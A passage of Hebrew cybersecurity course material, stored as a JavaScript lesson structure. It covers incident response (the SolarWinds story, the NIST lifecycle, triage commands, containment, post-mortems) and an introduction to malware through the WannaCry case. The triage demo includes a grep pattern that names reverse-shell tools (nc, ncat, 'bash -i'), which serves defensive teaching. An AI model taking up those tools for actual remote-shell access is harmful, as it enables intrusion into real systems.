            title: "הגנה על עצמכם",
            icon: "🛡️",
            content: "מנימום <code>OPSEC</code>: שם משתמש שונה בכל פלטפורמה, <code>VPN</code> כשרלוונטי, <code>privacy settings</code> מקסימליים ברשתות חברתיות, ולא לפרסם מידע שאפשר לקשר בחזרה אליכם. אנשי אבטחה רבים מחזיקים פרופילים ציבוריים מינימליים — לא מתוך פרנויה, אלא מתוך מקצועיות."
          },
          {
            title: "OSINT כקריירה",
            icon: "💼",
            content: "חוקרי <code>OSINT</code> מבוקשים מאוד — חברות מודיעין, משרדי חקירות, חדשות חקירתיות, וצוותי <code>Threat Intelligence</code> מחפשים אנשים עם יכולת מחקר ותשומת לב לפרטים. זו אחת הדרכים הטובות ביותר להיכנס לעולם הסייבר ללא רקע טכני עמוק."
          }
        ]
      }
    ]
  },
  {
    id: 114,
    title: "Incident Response — תגובה לאירועים",
    pages: [
      {
        type: "story",
        title: "SolarWinds — 9 חודשים בתוך הממשלה האמריקאית",
        content: `<div dir="rtl">
<div class="scenario-box scenario-alert">
  <p><strong>🚨 תרחיש:</strong> דצמבר 2020 — חברת אבטחה מגלה שנפרצה. החקירה חושפת: עדכון תוכנה רשמי וחתום של SolarWinds הכיל backdoor. 18,000 ארגונים נפגעו. 9 חודשים בתוך רשתות ממשלתיות.</p>
</div>

<div class="stat-highlight"><span class="stat-number">18,000</span><span class="stat-unit">ארגונים שהתקינו את העדכון הנגוע</span></div>
<div class="stat-highlight"><span class="stat-number">9</span><span class="stat-unit">חודשים שהתוקפים שוטטו ללא גילוי</span></div>

<h2>דצמבר 2020: הגילוי שזעזע את עולם הסייבר</h2>

<p>הכל התחיל כש-<code>Kevin Mandia</code>, מנכ"ל <code>FireEye</code> — אחת מחברות האבטחה המובילות בעולם — קיבל התרעה מוזרה: מישהו רשם מכשיר <code>MFA</code> חדש על חשבון של עובד. זה לא היה העובד.</p>

<p>החקירה שנפתחה חשפה משהו מצמרר: <code>FireEye</code> עצמה נפרצה. כלי תקיפה סודיים של <code>Red Team</code> נגנבו. אבל הסיפור האמיתי היה הרבה יותר גדול.</p>

<p>החוקרים עקבו אחרי שרשרת הפריצה — והגיעו ל-<code>SolarWinds Orion</code>, תוכנת ניהול <code>IT</code> שמותקנת ב-<strong>18,000 ארגונים</strong> כולל משרד האוצר האמריקאי, ה-<code>DoD</code>, <code>Microsoft</code>, ו-<code>Intel</code>.</p>

<p><strong>מה קרה:</strong></p>

<div class="incident-timeline">
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 1</div><div class="timeline-desc">APT29 (Cozy Bear) חדרו לסביבת הפיתוח של SolarWinds</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 2</div><div class="timeline-desc">הזריקו backdoor לקוד המקור — נוזקת SUNBURST</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">שלב 3</div><div class="timeline-desc">SolarWinds שחררה עדכון רגיל, חתום דיגיטלית — עם הנוזקה</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">שלב 4</div><div class="timeline-desc">SUNBURST "ישנה" שבועיים לפני הפעלה — חמיקה מ-sandbox</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 5</div><div class="timeline-desc">תקשורת C2 דרך DNS — נראתה כתעבורה לגיטימית</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">שלב 6</div><div class="timeline-desc">9 חודשים עד הגילוי — FireEye מזהה MFA anomaly</div></div>
</div>

<ol>
<li>תוקפים מקבוצת <code>APT29</code> (Cozy Bear, מודיעין רוסי) חדרו לסביבת הפיתוח של <code>SolarWinds</code></li>
<li>הזריקו <code>backdoor</code> לקוד המקור של <code>Orion</code> — נוזקת <code>SUNBURST</code></li>
<li><code>SolarWinds</code> שחררה עדכון רגיל, חתום דיגיטלית — עם הנוזקה בפנים</li>
<li><code>SUNBURST</code> "ישנה" שבועיים לפני הפעלה — כדי לחמוק מ-<code>sandbox</code></li>
<li>תקשורת <code>C2</code> עברה דרך <code>DNS</code> — נראתה כתעבורה לגיטימית</li>
<li><strong>9 חודשים</strong> עברו עד שהתגלתה. 9 חודשים שבהם תוקפים שוטטו בתוך רשתות של ממשלות ותאגידים.</li>
</ol>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> הפריצה הזו שינתה את הגישה ל-<code>Supply Chain Security</code>. עדכון תוכנה חתום — שנחשב "בטוח" — הפך לנשק. כתוצאה, <code>Biden</code> חתם על צו נשיאותי לשיפור אבטחת הסייבר, כולל דרישה ל-<code>SBOM</code> (Software Bill of Materials) מכל ספק ממשלתי.</div>
</div>`
      },
      {
        type: "explanation",
        title: "מחזור חיי IR — 6 שלבים לפי NIST",
        content: `<div dir="rtl">
<h2><code>Incident Response Lifecycle</code> — מההכנה להפקת לקחים</h2>

<p><code>NIST SP 800-61</code> מגדיר את התהליך. בפועל, 6 שלבים:</p>

<div class="attack-chain defense-chain">
  <div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-blue">1</span> Preparation</strong><p>בניית צוות, כלים, playbooks, ערוצי תקשורת, תרגולים</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-gold">2</span> Identification</strong><p>זיהוי האירוע — אמיתי או false positive? הכרזת חומרה</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-red">3</span> Containment</strong><p>בלימת הנזק — בידוד מכשירים, חסימת IPs, הגבלת lateral movement</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-red">4</span> Eradication</strong><p>הסרת הגורם — נוזקה, backdoor, פגיעות. מערכת נקייה</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-green">5</span> Recovery</strong><p>שחזור שירותים + ניטור מוגבר. חזרה לפעילות</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-blue">6</span> Lessons Learned</strong><p>מה קרה? מה השתבש? Post-mortem report והמלצות</p></div></div>
</div>

<table class="content-table">
  <tr><th>#</th><th>שלב</th><th>מה קורה</th><th>תוצר</th></tr>
  <tr><td>1</td><td><strong><code>Preparation</code></strong></td><td>בניית צוות, כלים, תרגולים</td><td><code>IR Plan</code>, <code>Playbooks</code>, ערוצי תקשורת</td></tr>
  <tr><td>2</td><td><strong><code>Identification</code></strong></td><td>זיהוי האירוע — אמיתי או <code>false positive</code>?</td><td>הכרזת אירוע, רמת חומרה</td></tr>
  <tr><td>3</td><td><strong><code>Containment</code></strong></td><td>בלימת הנזק — מיידי ולטווח ארוך</td><td>מכשירים מבודדים, <code>IPs</code> חסומים</td></tr>
  <tr><td>4</td><td><strong><code>Eradication</code></strong></td><td>הסרת הגורם — נוזקה, <code>backdoor</code>, פגיעות</td><td>מערכת נקייה</td></tr>
  <tr><td>5</td><td><strong><code>Recovery</code></strong></td><td>שחזור שירותים + ניטור מוגבר</td><td>חזרה לפעילות</td></tr>
  <tr><td>6</td><td><strong><code>Lessons Learned</code></strong></td><td>מה קרה? מה השתבש? מה משפרים?</td><td><code>Post-mortem</code> report</td></tr>
</table>

<p><strong>השלב הקריטי ביותר: <code>Containment</code></strong></p>

<p>בכל דקה שעוברת, תוקף ממשיך להתפשט ברשת. <code>Containment</code> מחולק לשניים:</p>

<p><strong>בלימה מיידית (<code>Short-term</code>):</strong> ניתוק מכשיר מהרשת, חסימת <code>IP</code> בפיירוול, השבתת חשבון משתמש. מהיר ואגרסיבי — עדיף לשבור משהו מאשר לתת לתוקף להמשיך.</p>

<p><strong>בלימה לטווח ארוך (<code>Long-term</code>):</strong> <code>patching</code>, סגמנטציה, <code>credential rotation</code>, בניית תמונה נקייה של מערכות. דורש זמן אבל מוודא שהתוקף לא יחזור.</p>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> טעות נפוצה: לקפוץ ישר ל-<code>Eradication</code> לפני <code>Containment</code> מלא. אם מוחקים נוזקה ממכשיר אחד אבל התוקף כבר במכשיר אחר — הוא חוזר תוך דקות. קודם מבודדים, אחר כך מנקים.</div>
</div>`
      },
      {
        type: "explanation",
        title: "הכנה — Playbooks, תקשורת וחדר מלחמה",
        content: `<div dir="rtl">
<h2><code>Preparation</code> — כי ברגע האמת, אין זמן לחשוב</h2>

<div class="info-box"><strong>ℹ️ <span class="phase-badge phase-blue">Preparation</span></strong> אירוע אבטחה הוא כמו שריפה. אתם לא רוצים לחפש את מטף הכיבוי כשהבניין בוער. הכנה מראש היא ההבדל בין שעה של כאוס לבין שעה של פעולה ממוקדת.</div>

<p>אירוע אבטחה הוא כמו שריפה. אתם לא רוצים לחפש את מטף הכיבוי כשהבניין בוער. הכנה מראש היא ההבדל בין שעה של כאוס לבין שעה של פעולה ממוקדת.</p>

<p><strong><code>IR Playbook</code> — ספר המתכונים לאירועים:</strong></p>

<table class="content-table">
  <tr><th>סוג אירוע</th><th>פעולות ראשוניות</th><th>מי אחראי</th></tr>
  <tr><td><code>Ransomware</code></td><td>ניתוק מהרשת, <strong>אל תכבו מכשירים</strong> (ראיות בזיכרון), בדיקת גיבויים</td><td>צוות <code>IR</code> + <code>IT Ops</code></td></tr>
  <tr><td><code>Data breach</code></td><td>זיהוי היקף הדליפה, הודעה למשפטית, שימור לוגים</td><td><code>IR</code> + משפטית + <code>DPO</code></td></tr>
  <tr><td><code>Phishing</code></td><td>חסימת שולח, בדיקת מי לחץ, איפוס סיסמאות</td><td><code>SOC</code> + <code>IT</code></td></tr>
  <tr><td><code>Insider threat</code></td><td>ניטור פעילות, שימור ראיות, שיתוף <code>HR</code></td><td><code>IR</code> + <code>HR</code> + משפטית</td></tr>
</table>

<p><strong>תוכנית תקשורת:</strong></p>
<ul>
<li><strong>ערוצי חירום:</strong> טלפון, <code>Signal</code>, או ערוץ <code>Slack</code> ייעודי. <strong>לא אימייל</strong> — אם המייל נפרץ, התוקף קורא את התגובה שלכם.</li>
<li><strong>רשימת אנשי קשר:</strong> <code>IR lead</code>, <code>CISO</code>, משפטית, יח"צ, ספקי <code>IR</code> חיצוניים (מנוי מראש).</li>
<li><strong>חדר מלחמה (<code>War Room</code>):</strong> מקום פיזי או וירטואלי שבו הצוות מתכנס. לוח מצב, <code>timeline</code>, משימות פתוחות.</li>
</ul>

<p><strong>תרגולים (<code>Tabletop Exercises</code>):</strong></p>
<p>פעם ברבעון, הצוות יושב ומדמה תרחיש: "יום שישי בצהריים, התגלתה נוזקת כופרה ב-3 שרתים. מה עושים?" ללא מחשבים — רק דיון. המטרה: לגלות פערים ב-<code>playbook</code> לפני שהם מתגלים באירוע אמיתי.</p>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> ארגונים שמתרגלים <code>IR</code> לפחות פעם בשנה מגיבים <strong>פי 2 מהר</strong> לאירועים אמיתיים ומפחיתים עלויות פריצה ב-$1.5 מיליון בממוצע (דוח <code>IBM Cost of Data Breach 2023</code>).</div>
</div>`
      },
      {
        type: "demo",
        title: "Detection & Triage — ניתוח לוגים ובניית Timeline",
        content: `<div dir="rtl">
<h2>זיהוי וטריאז' — הפקודות שמספרות את הסיפור</h2>

<div class="info-box"><strong>ℹ️ <span class="phase-badge phase-gold">Identification</span> + <span class="phase-badge phase-blue">Analysis</span></strong> כשמגיעה התרעה, האנליסט צריך לענות על 3 שאלות: מה קרה? מתי? עד כמה זה רחב?</div>

<p>כשמגיעה התרעה, האנליסט צריך לענות על 3 שאלות: <strong>מה קרה?</strong> <strong>מתי?</strong> <strong>עד כמה זה רחב?</strong></p>

<p><strong>Linux — פקודות <code>IR</code> ראשוניות:</strong></p>

<div class="code-preview"><pre><code># מי מחובר עכשיו?
w                               # משתמשים פעילים
last -n 30                      # 30 התחברויות אחרונות
lastb -n 20                     # 20 ניסיונות כושלים אחרונים

# תהליכים חשודים
ps auxf                         # עץ תהליכים — מי הריץ מה
ps aux | grep -E "nc|ncat|bash -i|python.*-c"  # reverse shells

# חיבורי רשת
ss -tulnp                       # פורטים פתוחים + תהליך אחראי
ss -anp | grep ESTABLISHED      # חיבורים פעילים — מחפשים C2

# קבצים שהשתנו לאחרונה (חשוד אם לא היה עדכון)
find /tmp /var/tmp /dev/shm -mtime -1 -type f 2>/dev/null

# Persistence — בדיקת מנגנוני התמדה
crontab -l                      # cron של המשתמש
cat /etc/crontab                # system cron
ls -la /etc/cron.d/             # drop-in cron files
systemctl list-unit-files --state=enabled  # services</code></pre></div>

<p><strong>Windows PowerShell — פקודות <code>IR</code>:</strong></p>

<div class="code-preview"><pre><code># תהליכים לפי צריכת CPU (נוזקת crypto mining?)
Get-Process | Sort-Object CPU -Descending | Select -First 20

# חיבורי רשת פעילים
Get-NetTCPConnection -State Established |
  Select LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess

# Scheduled Tasks חשודים
Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} |
  Select TaskName, TaskPath, Actions

# Event Log — כניסות מוצלחות (Event ID 4624)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 50

# Registry Run Keys — persistence
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"</code></pre></div>

<p><strong>Memory Forensics עם <code>Volatility</code>:</strong></p>

<div class="code-preview"><pre><code># Volatility 3 — ניתוח דמפ זיכרון
vol -f memory.dmp windows.pslist     # רשימת תהליכים
vol -f memory.dmp windows.pstree     # עץ תהליכים (מי ילד מי)
vol -f memory.dmp windows.netscan    # חיבורי רשת בזמן הדמפ
vol -f memory.dmp windows.malfind    # קוד מוזרק בזיכרון
vol -f memory.dmp windows.cmdline    # פרמטרים של כל תהליך</code></pre></div>

<div class="demo-note"><strong>טיפ מעשי:</strong> בנו <code>timeline</code> (ציר זמן) של כל ממצא. "14:32 — חיבור SSH חשוד מ-IP X. 14:35 — קובץ חדש ב-/tmp. 14:38 — cron job חדש." זה מספר את סיפור המתקפה.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Containment — בידוד, סיסמאות וגיבויים",
        content: `<div dir="rtl">
<h2>בלימה — לעצור את הדימום</h2>

<p>ברגע שזיהיתם אירוע, השעון מתקתק. כל דקה שעוברת — התוקף מתפשט, גונב עוד נתונים, או מתקין עוד <code>backdoors</code>. הנה סדר הפעולות:</p>

<p><strong>1. בידוד רשתי (<code>Network Isolation</code>):</strong></p>
<ul>
<li>מכשיר נגוע — ניתוק מהרשת (לא כיבוי! ראיות בזיכרון)</li>
<li><code>VLAN</code> נפרד למכשירים חשודים — עדיין ניתנים לניטור</li>
<li>חסימת <code>IPs</code> ודומיינים של <code>C2</code> בפיירוול</li>
<li>חסימת <code>lateral movement</code> — הגבלת <code>SMB</code>, <code>RDP</code>, <code>WinRM</code> בין סגמנטים</li>
</ul>

<p><strong>2. סיבוב הרשאות (<code>Credential Rotation</code>):</strong></p>
<ul>
<li>איפוס סיסמאות לכל חשבון שנחשף או חשוד</li>
<li><code>Kerberos</code>: איפוס <code>KRBTGT</code> פעמיים (למניעת <code>Golden Ticket</code>)</li>
<li>ביטול <code>API keys</code> ו-<code>tokens</code></li>
<li>סיבוב <code>certificates</code> אם רלוונטי</li>
</ul>

<p><strong>3. אימות גיבויים:</strong></p>
<ul>
<li>בדיקה שגיבויים קיימים ולא הוצפנו על ידי <code>ransomware</code></li>
<li>אימות שלמות (<code>integrity</code>) — האם הגיבוי נקי מנוזקה?</li>
<li>בדיקת תאריך הגיבוי — האם הנוזקה כבר הייתה בפנים?</li>
</ul>

<p><strong>4. שימור ראיות (<code>Evidence Preservation</code>):</strong></p>
<ul>
<li>דמפ זיכרון (<code>memory dump</code>) לפני כל שינוי</li>
<li>העתקת לוגים למקום בטוח (התוקף ינסה למחוק אותם)</li>
<li>תיעוד <code>chain of custody</code> — מי נגע במה ומתי</li>
</ul>

<div class="success-box"><strong>✅ טיפ לשימור ראיות:</strong> תמיד עשו <code>memory dump</code> לפני כל שינוי. העתיקו לוגים למקום נפרד מיד. תעדו כל פעולה עם timestamp — זה יהיה קריטי לדוח ה-post-mortem ולצרכים משפטיים.</div>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> <strong>אל תכבו מכשירים נגועים!</strong> כיבוי מוחק את הזיכרון (<code>RAM</code>) שמכיל ראיות קריטיות: תהליכים פעילים, מפתחות הצפנה, חיבורי <code>C2</code>. תמיד עשו <code>memory dump</code> קודם.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Post-Incident — דוחות, לקחים ושיפור",
        content: `<div dir="rtl">
<h2><code>Lessons Learned</code> — השלב שכולם מדלגים עליו</h2>

<p>אחרי שהאש כובתה, רוב הצוותים רוצים לשכוח ולהמשיך הלאה. זו טעות. <code>Post-mortem</code> טוב מונע את האירוע הבא.</p>

<p><strong>מבנה דוח <code>Post-Incident</code>:</strong></p>

<table class="content-table">
  <tr><th>סעיף</th><th>תוכן</th></tr>
  <tr><td><strong>סיכום מנהלים</strong></td><td>פסקה אחת: מה קרה, מה ההשפעה, מה עשינו</td></tr>
  <tr><td><strong><code>Timeline</code></strong></td><td>ציר זמן מדויק: מתחילת הפריצה עד לסגירה</td></tr>
  <tr><td><strong>גורם שורש (<code>Root Cause</code>)</strong></td><td>מה אפשר את הפריצה? פגיעות? טעות אנוש? תצורה שגויה?</td></tr>
  <tr><td><strong>השפעה (<code>Impact</code>)</strong></td><td>מערכות שנפגעו, נתונים שנחשפו, עלות כספית</td></tr>
  <tr><td><strong>פעולות שננקטו</strong></td><td>מה עשינו בכל שלב</td></tr>
  <tr><td><strong>המלצות</strong></td><td>מה צריך לשנות כדי למנוע חזרה</td></tr>
  <tr><td><strong><code>IOCs</code></strong></td><td>מזהים לשיתוף עם קהילת אבטחה</td></tr>
</table>

<p><strong>שאלות מפתח לפגישת <code>Lessons Learned</code>:</strong></p>
<ol>
<li>האם ה-<code>playbook</code> עבד? מה היה חסר?</li>
<li>האם ההתרעה הגיעה בזמן? למה כן/לא?</li>
<li>כמה זמן עבר עד <code>Containment</code>? איך מקצרים?</li>
<li>האם היו כלים שחסרו? (<code>EDR</code>, <code>SIEM rules</code>, <code>network visibility</code>)</li>
<li>האם התקשורת עם הנהלה/לקוחות הייתה אפקטיבית?</li>
</ol>

<p><strong>מטריקות <code>IR</code> חשובות:</strong></p>

<div class="stat-highlight"><span class="stat-number">204</span><span class="stat-unit">ימים — ממוצע זמן גילוי פריצה (MTTD)</span></div>
<div class="stat-highlight"><span class="stat-number">73</span><span class="stat-unit">ימים — ממוצע זמן בלימה (MTTC)</span></div>
<div class="stat-highlight"><span class="stat-number">$1.76M</span><span class="stat-unit">חיסכון עם IR plan מתורגל + AI detection</span></div>

<table class="content-table">
  <tr><th>מטריקה</th><th>מה מודדת</th><th>ממוצע תעשייתי (2023)</th></tr>
  <tr><td><code>MTTD</code> — <code>Mean Time to Detect</code></td><td>זמן עד גילוי הפריצה</td><td>204 ימים</td></tr>
  <tr><td><code>MTTC</code> — <code>Mean Time to Contain</code></td><td>זמן עד בלימה</td><td>73 ימים</td></tr>
  <tr><td><code>MTTR</code> — <code>Mean Time to Recover</code></td><td>זמן עד חזרה לפעילות</td><td>תלוי בחומרה</td></tr>
</table>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> ממוצע של <strong>204 ימים</strong> עד גילוי פריצה (דוח <code>IBM 2023</code>). כמעט 7 חודשים שבהם תוקף שוטט חופשי ברשת. ארגונים עם <code>IR plan</code> מתורגל ו-<code>AI-based detection</code> מגלים ב-108 ימים פחות ומפחיתים $1.76M מעלות הפריצה.</div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – מה היית עושה?",
        intro: "<p>תרגילי <code>IR</code> הם הדרך הטובה ביותר ללמוד. הנה תרחישים — אין תשובה אחת נכונה, אבל יש עקרונות שמנחים.</p>",
        blocks: [
          {
            title: "תרחיש: כופרה ביום שישי אחרי הצהריים",
            icon: "🔥",
            content: "15:30 ביום שישי. מסך אדום על 12 מכשירים: <code>Your files have been encrypted</code>. דרישה: 5 Bitcoin תוך 72 שעות. צוות ה-IT כבר בבית. מה הפעולה הראשונה שלך? (רמז: לא לשלם, ולא לכבות מכשירים)"
          },
          {
            title: "תרחיש: דליפת נתונים שקטה",
            icon: "🕵️",
            content: "<code>SOC</code> מזהה שתוקף שולח 2GB של נתונים החוצה כל לילה דרך <code>DNS tunneling</code>. זה כנראה קורה כבר שבוע. האם חוסמים מיד ומתריעים את התוקף שגילינו אותו? או שנותנים לו להמשיך ולומדים מה הוא עושה? הדילמה הקלאסית של <code>IR</code>."
          },
          {
            title: "תרחיש: Supply Chain כמו SolarWinds",
            icon: "📦",
            content: "התגלה שעדכון תוכנה שהתקנתם לפני 3 חודשים מכיל <code>backdoor</code>. התוכנה מותקנת על 200 שרתים. אתם לא יכולים לדעת אילו שרתים נפגעו ואילו לא. מה עושים? (רמז: <code>Assume breach</code> — הניחו שהכל נפרץ ועבדו משם)"
          },
          {
            title: "הלקח הגדול",
            icon: "💡",
            content: "הטעות הגדולה ביותר ב-<code>IR</code> היא לא טעות טכנית — היא פאניקה. אנשים שמגיבים מתוך פחד מכבים שרתים (הורסים ראיות), מוחקים דברים (מתריעים את התוקף), או מנסים לתקן לבד בלי לתעד (מאבדים מידע). <strong>הכי חשוב: לנשום, לתעד, ולפעול לפי ה-playbook.</strong>"
          }
        ]
      }
    ]
  },
  {
    id: 115,
    title: "Malware Analysis — מבוא",
    pages: [
      {
        type: "story",
        title: "WannaCry — כשהאקר בן 22 הציל את העולם בטעות",
        content: `<div dir="rtl">
<div class="scenario-box scenario-alert">
  <p><strong>🚨 תרחיש:</strong> יום שישי, מאי 2017 — בתי חולים בבריטניה קורסים. מסכים אדומים: "הקבצים שלך הוצפנו". תוך שעות — 150 מדינות נפגעות. חוקר בן 22, $10.69, ודומיין אחד עוצרים את כל זה.</p>
</div>

<div class="stat-highlight"><span class="stat-number">230,000</span><span class="stat-unit">מחשבים נפגעו ב-150 מדינות</span></div>
<div class="stat-highlight"><span class="stat-number">$4-8B</span><span class="stat-unit">נזק מוערך עולמי</span></div>

<h2>מאי 2017: 150 מדינות, 230,000 מחשבים, 4 ימים</h2>

<p>ביום שישי, 12 במאי 2017, בתי חולים בבריטניה התחילו לקרוס. מסכי מחשב הציגו הודעה אדומה: <code>Oops, your files have been encrypted!</code>. דרישה: $300 ב-<code>Bitcoin</code>. תוך שעות, הנוזקה התפשטה ל-150 מדינות.</p>

<p><code>WannaCry</code> הייתה <code>worm</code> — תולעת שמתפשטת ברשת בעצמה, ללא צורך בלחיצה של המשתמש. היא ניצלה פגיעות <code>EternalBlue</code> ב-<code>SMB</code> של <code>Windows</code> — כלי שדלף מה-<code>NSA</code> חודשיים קודם לכן.</p>

<p>באותו ערב, חוקר אבטחה בריטי בן 22 בשם <code>Marcus Hutchins</code> (ידוע כ-<code>MalwareTech</code>) ניתח את הנוזקה בביתו. הוא שם לב שהקוד מנסה להתחבר לדומיין ארוך ומוזר: <code>iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</code>.</p>

<p>הדומיין לא היה רשום. <code>Hutchins</code> רשם אותו — תמורת $10.69. ברגע שהדומיין הפך לפעיל, <code>WannaCry</code> בדקה את התגובה... <strong>ועצרה את עצמה</strong>. זה היה <code>kill switch</code> — מנגנון כיבוי שהמפתחים הטמיעו.</p>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> <code>Hutchins</code> לא ידע שהוא מציל את העולם. הוא חשב שזו טכניקת <code>anti-sandbox</code> (נוזקות בודקות אם הן ב-<code>sandbox</code> על ידי ניסיון לגשת לדומיין שלא קיים — אם מצליח, כנראה <code>sandbox</code>). ייחוס: <code>Lazarus Group</code> (צפון קוריאה). נזק מוערך: $4-8 מיליארד.</div>

<p>הסיפור הזה ממחיש את כל עולם ניתוח הנוזקות: <strong>הבנה של איך הקוד עובד</strong> יכולה לעצור מגיפה עולמית.</p>
</div>`
      },
      {
        type: "explanation",
        title: "סוגי נוזקות — המדריך המלא",
        content: `<div dir="rtl">
<h2><code>Malware</code> — כל הסוגים שצריך להכיר</h2>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🦠</div><div class="mini-card-title">Virus</div><div class="mini-card-desc">מדביק קבצים, צריך "מארח" שנפתח</div></div>
  <div class="mini-card"><div class="mini-card-icon">🐛</div><div class="mini-card-title">Worm</div><div class="mini-card-desc">מתפשט ברשת בעצמו, מנצל פגיעויות</div></div>
  <div class="mini-card"><div class="mini-card-icon">🐴</div><div class="mini-card-title">Trojan</div><div class="mini-card-desc">מתחזה לתוכנה לגיטימית</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔒</div><div class="mini-card-title">Ransomware</div><div class="mini-card-desc">מצפין קבצים, דורש כופר</div></div>
  <div class="mini-card"><div class="mini-card-icon">👻</div><div class="mini-card-title">Rootkit</div><div class="mini-card-desc">מסתיר נוכחות ב-OS/kernel</div></div>
  <div class="mini-card"><div class="mini-card-icon">🕵️</div><div class="mini-card-title">Spyware</div><div class="mini-card-desc">גנב מידע בשקט — הקשות, מסך</div></div>
  <div class="mini-card"><div class="mini-card-icon">🎮</div><div class="mini-card-title">RAT</div><div class="mini-card-desc">שליטה מרחוק מלאה במכשיר</div></div>
  <div class="mini-card"><div class="mini-card-icon">🤖</div><div class="mini-card-title">Botnet</div><div class="mini-card-desc">רשת מכשירים נגועים בשליטת תוקף</div></div>
</div>

<table class="content-table">
  <tr><th>סוג</th><th>מה עושה</th><th>איך מתפשט</th><th>דוגמה מפורסמת</th></tr>
  <tr><td><strong>🦠 <code>Virus</code></strong></td><td>מדביק קבצים, מריץ קוד זדוני</td><td>צריך "מארח" — קובץ שנפתח</td><td><code>CIH</code>, <code>Melissa</code></td></tr>
  <tr><td><strong>🐛 <code>Worm</code></strong></td><td>מתפשט ברשת, יכול להשבית מערכות</td><td>עצמאי — מנצל פגיעויות רשת</td><td><code>WannaCry</code>, <code>Conficker</code></td></tr>
  <tr><td><strong>🐴 <code>Trojan</code></strong></td><td>מתחזה לתוכנה לגיטימית</td><td>המשתמש מתקין בעצמו</td><td><code>Emotet</code>, <code>ZeuS</code></td></tr>
  <tr><td><strong>🔒 <code>Ransomware</code></strong></td><td>מצפין קבצים, דורש כופר</td><td>פישינג, פגיעויות, <code>RDP</code></td><td><code>LockBit</code>, <code>REvil</code></td></tr>
  <tr><td><strong>👻 <code>Rootkit</code></strong></td><td>מסתיר נוכחות ב-<code>OS</code>/<code>kernel</code></td><td>בדרך כלל אחרי פריצה ראשונית</td><td><code>TDSS</code>, <code>Necurs</code></td></tr>
  <tr><td><strong>🕵️ <code>Spyware</code></strong></td><td>גנב מידע בשקט (הקשות, מסך)</td><td>הורדה שקטה, <code>exploit</code></td><td><code>Pegasus</code>, <code>FinFisher</code></td></tr>
  <tr><td><strong>🎮 <code>RAT</code></strong></td><td>שליטה מרחוק מלאה במכשיר</td><td>פישינג, <code>trojanized software</code></td><td><code>Cobalt Strike</code>, <code>NjRAT</code></td></tr>
  <tr><td><strong>🤖 <code>Botnet</code></strong></td><td>רשת מכשירים נגועים בשליטת תוקף</td><td>תולעות, פגיעויות <code>IoT</code></td><td><code>Mirai</code>, <code>Emotet</code></td></tr>
</table>

<p><strong>שתי מגמות מודרניות:</strong></p>

<p><strong><code>Fileless Malware</code>:</strong> נוזקה שלא כותבת קבצים לדיסק. רצה ישירות בזיכרון, משתמשת ב-<code>PowerShell</code>, <code>WMI</code>, או <code>registry</code>. אנטי-וירוס מסורתי לא מזהה כי אין קובץ לסרוק.</p>

<p><strong><code>Ransomware-as-a-Service</code> (<code>RaaS</code>):</strong> מפתחי נוזקה מוכרים "מנוי" לתוקפים אחרים. <code>LockBit</code>, לדוגמה, מספקת את הנוזקה, דף תשלום, ותמיכה טכנית. השותף (affiliate) מבצע את ההתקפה ומחלק רווחים.</p>
</div>`
      },
      {
        type: "explanation",
        title: "איך נוזקה מתפשטת — וקטורי תקיפה",
        content: `<div dir="rtl">
<h2>וקטורי הפצה — איך נוזקה מגיעה אליכם</h2>

<div class="stat-highlight"><span class="stat-number">~70%</span><span class="stat-unit">מהפריצות מתחילות בפישינג באימייל</span></div>

<p>נוזקה צריכה דרך להיכנס. הנה הוקטורים הנפוצים ביותר, מהשכיח לנדיר:</p>

<p><strong>1. 📧 פישינג באימייל (הנפוץ ביותר — ~70% מהפריצות)</strong></p>
<p>אימייל עם קובץ מצורף (<code>PDF</code>, <code>DOCX</code> עם מאקרו, <code>ZIP</code>) או קישור לאתר זדוני. התוקף מתחזה לגורם מוכר: בנק, ספק, קולגה.</p>

<p><strong>2. 🌐 <code>Drive-by Download</code></strong></p>
<p>גלישה לאתר נגוע (או אתר לגיטימי שנפרץ) מפעילה <code>exploit</code> שמתקין נוזקה — ללא לחיצה של המשתמש. דורש פגיעות בדפדפן או ב-<code>plugin</code>.</p>

<p><strong>3. 🔑 <code>RDP</code> חשוף + סיסמה חלשה</strong></p>
<p>שרתי <code>Windows</code> עם <code>RDP</code> (פורט 3389) חשוף לאינטרנט. תוקפים סורקים, מנסים <code>brute force</code>, ומקבלים שליטה מלאה. הוקטור הנפוץ ביותר ל-<code>ransomware</code>.</p>

<p><strong>4. 💾 <code>USB</code> ומדיה פיזית</strong></p>
<p>מפתח <code>USB</code> "שכוח" בחניון — קלאסי. כשמישהו מחבר, הנוזקה רצה. עדיין עובד, במיוחד נגד מתקנים מבודדים (<code>air-gapped</code>). ככה <code>Stuxnet</code> הגיע לצנטריפוגות של איראן.</p>

<p><strong>5. 📦 <code>Supply Chain</code></strong></p>
